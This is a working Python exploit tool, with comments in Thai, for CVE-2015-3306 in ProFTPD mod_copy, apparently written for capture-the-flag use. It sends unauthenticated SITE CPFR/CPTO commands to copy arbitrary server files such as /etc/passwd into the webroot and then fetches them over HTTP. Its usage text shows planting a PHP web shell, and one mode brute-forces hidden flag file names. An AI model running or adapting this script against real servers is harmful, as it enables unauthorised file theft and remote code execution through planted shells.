#!/usr/bin/env python3
"""CVE-2015-3306 - ProFTPD mod_copy arbitrary file copy (read/write on server).

ProFTPD 1.3.4 - 1.3.5 ที่เปิด mod_copy ให้สั่ง
    SITE CPFR <src>
    SITE CPTO <dst>
เพื่อคัดลอกไฟล์ฝั่งเซิร์ฟเวอร์ (ไม่ใช่ FTP transfer) และมักทำงานได้แม้ยังไม่ login

ตัวอย่าง
-------
# อ่านไฟล์อะไรก็ได้ โดย copy ไป webroot แล้วดึงผ่าน HTTP
python tools/proftpd_modcopy_cve_2015_3306.py --host target --read /etc/passwd
python tools/proftpd_modcopy_cve_2015_3306.py --host target --read /start.sh --web http://target

# copy ไฟล์ไป path ที่ต้องการ (เช่น วาง PHP shell ลง webroot)
python tools/proftpd_modcopy_cve_2015_3306.py --host target --cpfr /tmp/shell.php --cpto /var/www/html/shell.php

# หา flag ที่ถูก rename จาก timestamp (flag_<5 chars>.txt)
python tools/proftpd_modcopy_cve_2015_3306.py --host target --find-flag

หมายเหตุ: --read ต้องมี web server เสิร์ฟ webroot เดียวกัน (default /var/www/html)
ถ้าไม่รู้ webroot ให้ใช้ --cpto เองแล้ว fetch ผ่านช่องทางที่เหมาะสม
"""

import argparse
import base64
import hashlib
import json
import re
import secrets
import socket
import sys

try:
    import requests
except ImportError:
    sys.exit("ต้องติดตั้ง requests ก่อน: pip install requests")

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


class FTPClient:
    """FTP แบบดิบ (multi-line reply aware) เพราะ mod_copy ใช้ได้ก่อน login"""

    def __init__(self, host, port=21, timeout=15):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.banner = self.read()

    def read(self):
        lines = []
        while True:
            while b"\n" not in self.buf:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                self.buf += chunk
            line, _, self.buf = self.buf.partition(b"\n")
            text = line.decode(errors="replace").rstrip("\r")
            lines.append(text)
            if re.match(r"^\d{3} ", text):
                break
        return " | ".join(lines)

    def cmd(self, command):
        self.sock.sendall((command + "\r\n").encode())
        return self.read()

    def close(self):
        try:
            self.cmd("QUIT")
        except Exception:
            pass
        self.sock.close()


def copy_file(host, port, src, dst):
    """CPFR + CPTO แบบ session ใหม่ (เลี่ยง state ค้าง)"""
    f = FTPClient(host, port)
    try:
        r1 = f.cmd("SITE CPFR " + src)
        if not r1.startswith("350"):
            return False, r1
        r2 = f.cmd("SITE CPTO " + dst)
        return r2.startswith("250"), "%s / %s" % (r1, r2)
    finally:
        f.close()


def read_remote(host, port, web, webroot, src):
    name = "modcopy_%s.txt" % secrets.token_hex(4)
    dst = webroot.rstrip("/") + "/" + name
    ok, msg = copy_file(host, port, src, dst)
    if not ok:
        print("[-] copy %s -> %s failed: %s" % (src, dst, msg))
        return None
    url = web.rstrip("/") + "/" + name
    try:
        r = requests.get(url, timeout=30)
        print("[+] %s -> %s (HTTP %s)" % (src, url, r.status_code))
        return r.text
    except Exception as exc:
        print("[-] fetch %s failed: %s" % (url, exc))
        return None


def get_proc_value(host, port, web, webroot, path, pattern):
    text = read_remote(host, port, web, webroot, path)
    if not text:
        return None
    m = re.search(pattern, text)
    return m


def find_flag(host, port, web, webroot, window, prefix, ext):
    btime_m = get_proc_value(host, port, web, webroot, "/proc/stat", r"btime\s+(\d+)")
    if not btime_m:
        print("[-] อ่าน btime จาก /proc/stat ไม่ได้")
        return None
    btime = int(btime_m.group(1))

    stat = read_remote(host, port, web, webroot, "/proc/1/stat")
    if not stat:
        print("[-] อ่าน /proc/1/stat ไม่ได้")
        return None
    # field 22 = starttime (jiffies หลัง boot) ตัด pid/comm ออกก่อน
    body = re.sub(r"^\d+\s+\(.*?\)\s+", "", stat.strip())
    fields = body.split()
    try:
        starttime = int(fields[19])  # 22 - 3
    except Exception:
        print("[-] parse starttime ไม่ได้")
        return None

    estimate = btime + starttime // 100
    print("[*] btime=%d starttime=%d -> start ~%d" % (btime, starttime, estimate))

    def name_for(t):
        hexd = hashlib.sha256(str(t).encode() + b"\n").hexdigest()
        return base64.b64encode((hexd + "  -\n").encode()).decode()[:5]

    f = FTPClient(host, port)
    try:
        for t in range(estimate - window, estimate + window + 1):
            name = name_for(t)
            path = "/tmp/%s_%s%s" % (prefix, name, ext)
            r = f.cmd("SITE CPFR " + path)
            if r.startswith("350"):
                print("[+] พบไฟล์: %s (t=%d)" % (path, t))
                content = read_remote(host, port, web, webroot, path)
                if content:
                    print("[+] content: %r" % content)
                    flags = re.findall(r"[A-Za-z0-9_]{2,20}\{[^}\n]{3,80}\}", content)
                    if flags:
                        print("[+] flag-like: %s" % ", ".join(sorted(set(flags))))
                return path
            if t % 500 == 0:
                print("[*] tried offset %+d" % (t - estimate))
    finally:
        f.close()
    print("[-] ไม่พบไฟล์ใน window ±%d วินาที (ลองเพิ่ม --window)" % window)
    return None


def main():
    ap = argparse.ArgumentParser(description="CVE-2015-3306 ProFTPD mod_copy")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=21)
    ap.add_argument("--web", help="base URL ของ web ที่เสิร์ฟ webroot (เช่น http://target)")
    ap.add_argument("--webroot", default="/var/www/html", help="path writable ที่ web เสิร์ฟ")
    ap.add_argument("--read", help="อ่านไฟล์ปลายทาง (copy -> webroot -> HTTP GET)")
    ap.add_argument("--cpfr", help="source path สำหรับ SITE CPFR")
    ap.add_argument("--cpto", help="destination path สำหรับ SITE CPTO")
    ap.add_argument("--find-flag", action="store_true", help="หา /tmp/<prefix>_<5>.txt จาก timestamp")
    ap.add_argument("--prefix", default="flag")
    ap.add_argument("--ext", default=".txt")
    ap.add_argument("--window", type=int, default=1800, help="ช่วง brute ชื่อไฟล์ (วินาที)")
    args = ap.parse_args()

    if args.read:
        if not args.web:
            raise SystemExit("--read ต้องระบุ --web ด้วย (เช่น http://target)")
        text = read_remote(args.host, args.port, args.web, args.webroot, args.read)
        if text is not None:
            print(text)
        return

    if args.cpfr or args.cpto:
        if not (args.cpfr and args.cpto):
            raise SystemExit("ต้องระบุทั้ง --cpfr และ --cpto")
        ok, msg = copy_file(args.host, args.port, args.cpfr, args.cpto)
        print(("[+] " if ok else "[-] ") + msg)
        return

    if args.find_flag:
        if not args.web:
            raise SystemExit("--find-flag ต้องระบุ --web ด้วย")
        find_flag(args.host, args.port, args.web, args.webroot, args.window, args.prefix, args.ext)
        return

    ap.print_help()


if __name__ == "__main__":
    main()
